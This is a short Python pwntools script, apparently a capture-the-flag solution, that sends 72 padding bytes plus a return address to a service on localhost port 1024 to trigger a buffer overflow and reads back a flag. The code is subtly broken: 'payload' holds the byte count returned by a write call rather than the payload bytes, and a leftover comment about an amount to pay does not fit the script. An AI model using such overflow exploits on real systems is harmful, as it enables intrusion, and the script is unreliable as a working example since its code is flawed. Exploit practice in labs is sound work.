from pwn import *

# Set up the connection to the remote server
host = 'localhost'
port = 1024
conn = remote(host, port)

# Read the welcome message and prompt for input
msg = conn.recvuntil('> ')
print(msg)
payload = sys.stdout.buffer.write(b"A" * 72 + b"\x4e\x12\x40\x00\x00")


print(payload)
conn.sendline(payload)  # Replace with the amount you want to pay

# Read the response and check if the flag is printed
resp = conn.recvuntil('\n')
print(resp)
if b'flag{' in resp:
    print(resp)

# Close the connection
conn.close()

